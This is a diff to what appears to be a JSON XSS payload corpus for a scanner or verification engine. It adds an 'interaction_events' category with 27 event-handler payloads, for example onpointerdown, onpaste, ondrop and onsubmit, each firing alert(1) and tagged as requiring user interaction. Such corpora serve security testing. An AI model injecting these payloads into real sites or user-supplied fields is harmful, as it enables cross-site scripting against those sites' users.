@@ -42,7 +42,8 @@
       "css_exfil",
       "data_uri",
       "html5_new",
-      "portswigger_events"
+      "portswigger_events",
+      "interaction_events"
     ]
   },
   "payloads": [
@@ -14294,6 +14295,330 @@
       "confidence": "high",
       "payload": "<video ontimeupdate=alert(1) src=x>",
       "note": "media playback-position event (completes the cheat-sheet no_interaction event set)"
+    },
+    {
+      "id": "ps-ia-001",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointerdown=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-002",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointerup=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-003",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointermove=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-004",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointerover=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-005",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointerout=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-006",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onpointerenter=alert(1)>x</button>",
+      "note": "pointer interaction; the DOM engine dispatches synthetic events on marker-bearing elements"
+    },
+    {
+      "id": "ps-ia-007",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onmousedown=alert(1)>x</button>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-008",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button onmouseup=alert(1)>x</button>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-009",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onmousemove=alert(1)>x</div>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-010",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onmouseover=alert(1)>x</div>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-011",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onmouseout=alert(1)>x</div>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-012",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onmouseenter=alert(1)>x</div>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-013",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<button ondblclick=alert(1)>x</button>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-014",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div onwheel=alert(1)>x</div>",
+      "note": "mouse interaction; synthetic dispatch in the DOM engine/verify"
+    },
+    {
+      "id": "ps-ia-015",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input oncopy=alert(1) value=abc>",
+      "note": "clipboard event (synthetic ClipboardEvent)"
+    },
+    {
+      "id": "ps-ia-016",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onbeforecopy=alert(1) value=abc>",
+      "note": "clipboard event (synthetic ClipboardEvent)"
+    },
+    {
+      "id": "ps-ia-017",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onpaste=alert(1) value=abc>",
+      "note": "clipboard event (synthetic ClipboardEvent)"
+    },
+    {
+      "id": "ps-ia-018",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onbeforepaste=alert(1) value=abc>",
+      "note": "clipboard event (synthetic ClipboardEvent)"
+    },
+    {
+      "id": "ps-ia-019",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondragstart=alert(1)>x</div>",
+      "note": "drag interaction (synthetic DragEvent)"
+    },
+    {
+      "id": "ps-ia-020",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondragover=alert(1)>x</div>",
+      "note": "drag interaction (synthetic DragEvent)"
+    },
+    {
+      "id": "ps-ia-021",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondragenter=alert(1)>x</div>",
+      "note": "drag interaction (synthetic DragEvent)"
+    },
+    {
+      "id": "ps-ia-022",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div draggable=true ondrop=alert(1)>x</div>",
+      "note": "drop event (synthetic DragEvent)"
+    },
+    {
+      "id": "ps-ia-023",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ontouchstart=alert(1)>x</div>",
+      "note": "touch interaction (synthetic TouchEvent with Event fallback)"
+    },
+    {
+      "id": "ps-ia-024",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<div ontouchmove=alert(1)>x</div>",
+      "note": "touch interaction (synthetic TouchEvent with Event fallback)"
+    },
+    {
+      "id": "ps-ia-025",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<form onsubmit=alert(1)><input type=submit></form>",
+      "note": "form submit (synthetic, no default action)"
+    },
+    {
+      "id": "ps-ia-026",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input oninvalid=alert(1) required>",
+      "note": "constraint validation event"
+    },
+    {
+      "id": "ps-ia-027",
+      "context": "interaction_events",
+      "tags": [
+        "portswigger",
+        "requires_interaction",
+        "event"
+      ],
+      "confidence": "high",
+      "payload": "<input onselect=alert(1) value=abc>",
+      "note": "text selection event"
     }
   ],
   "polyglots": [
